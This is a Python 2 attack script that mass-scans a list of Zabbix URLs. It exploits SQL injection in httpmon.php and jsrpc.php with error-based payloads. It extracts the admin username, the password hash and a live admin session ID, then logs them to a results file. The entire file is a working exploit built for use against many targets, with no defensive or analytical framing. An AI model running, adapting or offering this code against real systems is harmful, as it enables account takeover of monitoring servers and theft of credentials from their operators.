#!/usr/bin/env python
#-*- coding:utf-8 -*-
#@Author:RedNiu
#版权声明：未经允许不得传播和转载
# Date: 2016/8/18
 
import urllib,urllib2,os,sys,requests,BeautifulSoup
 
payload_httpmon = "/httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(alias,0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
payload_jsrpc = "/jsrpc.php?type=9&method=screen.get×tamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1%20AND%20(SELECT%201231%20FROM(SELECT%20COUNT(*),CONCAT(0x716a717a71,(SELECT%20MID((IFNULL(CAST(concat(alias,0x7e,passwd,0x7e)%20AS%20CHAR),0x20)),1,54)%20FROM%20zabbix.users%20ORDER%20BY%20name%20LIMIT%201,1),0x717a6b7a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
 
def ZabbixTest(Zabbix_url):
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1;WOW64) AppleWebkit/537.36 (KHTML,like Gecko) Chrome/27.0.1453.94 Safari/537.36"
    }
    try:
        content=urllib.urlopen(Zabbix_url)
        if content.getcode()==200:
            try:
                r=requests.get((Zabbix_url+payload_httpmon),headers=headers)
                if r.text.find("Duplicate entry") != -1 and r.text.find("for key") != -1:
                    Zabbix_admin=str(BeautifulSoup.BeautifulSoup(r.text).findAll(attrs={"class":"error"})).split("Duplicate entry \'")[1].split("~")[0].split("~~1")[0]
                    Zabbix_passsword=str(BeautifulSoup.BeautifulSoup(r.text).findAll(attrs={"class":"error"})).split("Duplicate entry \'")[1].split("~")[1].split("~~1")[0]
                    ZabbixTest_url=Zabbix_url+"httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),%20concat((select(select%20concat(cast(concat(sessionid,0x7e,userid,0x7e,status)%20as%20char),0x7e))%20from%20zabbix.sessions%20where%20status=0%20and%20userid=1%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
                    if requests.get((ZabbixTest_url),headers=headers).text.find("Duplicate entry") != -1 and requests.get((ZabbixTest_url),headers=headers).text.find("for key") != -1:
                        Zabbix_sessionid=str(BeautifulSoup.BeautifulSoup(urllib.urlopen(ZabbixTest_url).read()).findAll(attrs={"class":"error"})).split("Duplicate entry \'")[1].split("\' for key")[0]
                    else:
                        Zabbix_sessionid="NULL"
                else:
                    Zabbix_admin=str(BeautifulSoup.BeautifulSoup(urllib.urlopen(Zabbix_url+payload_jsrpc).read()).findAll(attrs={"class":"error"})).split("Duplicate entry \'qjqzq")[1].split("~qzkzq1")[0].split("~")[0]
                    Zabbix_passsword=str(BeautifulSoup.BeautifulSoup(urllib.urlopen(Zabbix_url+payload_jsrpc).read()).findAll(attrs={"class":"error"})).split("Duplicate entry \'qjqzq")[1].split("~qzkzq1")[0].split("~")[1]
                    ZabbixTest_url=Zabbix_url+"/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get×tamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),%20(select%20sessionid%20from%20sessions%20where%20userid=1%20and%20status=0%20limit%201))x%20from%20information_schema.character_sets%20group%20by%20x)y)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color="
                    if requests.get((ZabbixTest_url),headers=headers).text.find("Duplicate entry") != -1 and requests.get((ZabbixTest_url),headers=headers).text.find("for key") != -1:
                        Zabbix_sessionid = str(BeautifulSoup.BeautifulSoup(urllib.urlopen(ZabbixTest_url).read()).findAll(attrs={"class":"error"})).split("Duplicate entry \'")[1].split("\' for key")[0]
                    else:
                        Zabbix_sessionid="NULL"
                with open('ZabbixTest_success.txt', 'a') as fp:fp.write(Zabbix_url +'\r\n\r\n'+'[>>>>>>>>>> Username: '+Zabbix_admin+'    Password: '+Zabbix_passsword+'    Cookie_Sessionid: '+Zabbix_sessionid+' <<<<<<<<<<]\r\n\r\n')
                fp.close()
            except:
                pass
    except:
            pass
 
if __name__=='__main__':
    if len(sys.argv)<2:
        print ('useage:python %s Zabbix_url.txt'%(sys.argv[0]))
        exit()
    if os.path.exists('ZabbixTest_success.txt'):
        os.remove('ZabbixTest_success.txt')
    if os.path.isfile(sys.argv[1]) != True:
        exit()
    f = open(sys.argv[1],"r")
    lines = f.readlines()
    for url in lines:
        url =url.replace('\r\n','').replace(' ','').replace('\n','').replace('index.php','')
        Zabbix_url=url.split(" ")[0]
        print "This is url:---------"+Zabbix_url+"---------Checking!"
        ZabbixTest(Zabbix_url)
        #if ZabbixTest(Zabbix_url):
             #with open('ZabbixTest_success.txt', 'a') as fp:fp.write(Zabbix_url +'\r\n'+'Username:'+Zabbix_admin+'    Password:'+Zabbix_passsword+'    Cookie_Sessionid:'+Zabbix_sessionid+'\r\n')
             #fp.close()
    print "These Url Check Successfully!"
